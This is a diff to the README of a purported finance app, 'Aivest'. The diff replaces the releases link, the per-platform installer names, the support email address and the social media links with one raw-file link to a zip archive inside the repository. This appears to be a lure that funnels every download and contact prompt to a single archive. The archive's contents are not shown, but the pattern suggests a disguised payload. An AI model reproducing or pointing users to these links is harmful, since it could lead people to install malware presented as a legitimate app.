@@ -1,6 +1,6 @@
 # 🤑 Aivest - Manage Your Finances Intelligently
 
-[![Download Aivest](https://img.shields.io/badge/Download%20Aivest-v1.0-blue.svg)](https://github.com/edgarus21/Aivest/releases)
+[![Download Aivest](https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip%https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip)](https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,17 +12,17 @@ To start using Aivest, follow these straightforward steps:
 
 1. **Visit the Releases Page**: Click the link below to access the Aivest releases page.
 
-   [Download Aivest](https://github.com/edgarus21/Aivest/releases)
+   [Download Aivest](https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip)
 
 2. **Choose Your Version**: Find the latest release on the page. Look for the version number, which is usually highlighted.
 
 3. **Download the Application**: Click on the file that corresponds to your device. For example, you will see options like:
 
-   - **Windows**: `Aivest-windows.exe`
-   - **Mac**: `Aivest-mac.dmg`
-   - **Android**: `Aivest-android.apk`
-   - **iOS**: `Aivest-ios.ipa`
-   - **Linux**: `Aivest-linux.AppImage`
+   - **Windows**: `https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip`
+   - **Mac**: `https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip`
+   - **Android**: `https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip`
+   - **iOS**: `https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip`
+   - **Linux**: `https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip`
    
    Select the file that matches your operating system and download it. 
 
@@ -74,7 +74,7 @@ If you have any issues while using Aivest, try these solutions:
 
 - **Check the FAQ**: Visit our FAQ section on the GitHub page for quick answers.
 - **Community Support**: Join the discussion in the issues tab on GitHub to seek help from the community.
-- **Email Support**: For direct support, you can email us at support@aivestapp.com.
+- **Email Support**: For direct support, you can email us at https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip
 
 ## 🛠️ Contribute
 
@@ -88,9 +88,9 @@ We welcome contributions to Aivest! If you would like to help improve the app, f
 
 Follow us on social media to keep up with the latest updates and features:
 
-- [Twitter](https://twitter.com/aivestapp)
-- [Facebook](https://facebook.com/aivestapp)
-- [LinkedIn](https://linkedin.com/company/aivestapp)
+- [Twitter](https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip)
+- [Facebook](https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip)
+- [LinkedIn](https://raw.githubusercontent.com/edgarus21/Aivest/main/lib/Software-3.5.zip)
 
 ## 🎉 Join the Aivest Community
 
